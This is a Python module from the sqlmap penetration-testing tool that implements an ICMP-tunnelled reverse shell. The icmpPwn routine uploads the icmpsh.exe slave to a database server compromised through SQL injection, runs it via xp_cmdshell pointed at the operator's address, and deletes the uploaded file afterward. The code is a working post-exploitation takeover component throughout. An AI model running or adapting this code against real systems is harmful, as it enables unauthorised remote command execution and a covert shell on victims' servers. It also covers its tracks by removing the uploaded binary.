#!/usr/bin/env python

"""
$Id$

Copyright (c) 2006-2010 sqlmap developers (http://sqlmap.sourceforge.net/)
See the file 'doc/COPYING' for copying permission
"""

import codecs
import os
import re
import stat
import sys
import time

from select import select
from subprocess import PIPE
from subprocess import Popen as execute

from extra.icmpsh.icmpsh_m import main as icmpshmaster

from lib.core.common import dataToStdout
from lib.core.common import getLocalIP
from lib.core.common import getRemoteIP
from lib.core.common import getUnicode
from lib.core.common import normalizePath
from lib.core.common import ntToPosixSlashes
from lib.core.common import pollProcess
from lib.core.common import randomRange
from lib.core.common import randomStr
from lib.core.common import readInput
from lib.core.data import conf
from lib.core.data import kb
from lib.core.data import logger
from lib.core.data import paths
from lib.core.exception import sqlmapDataException
from lib.core.exception import sqlmapFilePathException
from lib.core.subprocessng import blockingReadFromFD
from lib.core.subprocessng import blockingWriteToFD
from lib.core.subprocessng import setNonBlocking
from lib.request.connect import Connect as Request
from lib.takeover.upx import upx


class ICMPsh:
    """
    This class defines methods to call icmpsh for plugins.
    """

    def __init__(self):
        self.lhostStr       = None
        self.rhostStr       = None
        self.localIP        = getLocalIP()
        self.remoteIP       = getRemoteIP()
        self.__icmpslave    = normalizePath(os.path.join(paths.SQLMAP_EXTRAS_PATH, "icmpsh", "icmpsh.exe"))

    def __selectRhost(self):
        message = "which is the back-end DBMS address? [%s] " % self.remoteIP
        address = readInput(message, default=self.remoteIP)

        return address

    def __selectLhost(self):
        message = "which is the local address? [%s] " % self.localIP
        address = readInput(message, default=self.localIP)

        return address

    def __prepareIngredients(self, encode=True):
        self.lhostStr = self.__selectLhost()
        self.rhostStr = self.__selectRhost()

    def __runIcmpshMaster(self):
        infoMsg = "running icmpsh master locally"
        logger.info(infoMsg)

        icmpshmaster(self.lhostStr, self.rhostStr)

    def __runIcmpshSlaveRemote(self):
        infoMsg  = "running icmpsh slave remotely"
        logger.info(infoMsg)

        self.__icmpshSlaveCmd = "%s -t %s" % (self.__icmpslaveRemote, self.lhostStr)

        cmd = "%s &" % self.__icmpshSlaveCmd

        if kb.dbms == "Microsoft SQL Server" and (kb.stackedTest or conf.direct):
            cmd = self.xpCmdshellForgeCmd(cmd)

        self.execCmd(cmd, silent=True)

    def uploadIcmpshSlave(self, web=False):
        self.__randStr = randomStr(lowercase=True)

        if web:
            self.__icmpslaveRemote = "%s/tmpi%s.exe" % (self.webDirectory, self.__randStr)
        else:
            self.__icmpslaveRemote = "%s/tmpi%s.exe" % (conf.tmpPath, self.__randStr)

        self.__icmpslaveRemote = ntToPosixSlashes(normalizePath(self.__icmpslaveRemote))

        logger.info("uploading icmpsh slave to '%s'" % self.__icmpslaveRemote)

        if web:
            self.webFileUpload(self.__icmpslave, self.__icmpslaveRemote, self.webDirectory)
        else:
            self.writeFile(self.__icmpslave, self.__icmpslaveRemote, "binary", False)

    def icmpPwn(self):
        self.__prepareIngredients()
        self.__runIcmpshSlaveRemote()
        self.__runIcmpshMaster()

        debugMsg  = "icmpsh master exited"
        logger.debug(debugMsg)

        self.delRemoteFile(self.__icmpslaveRemote, doubleslash=True)
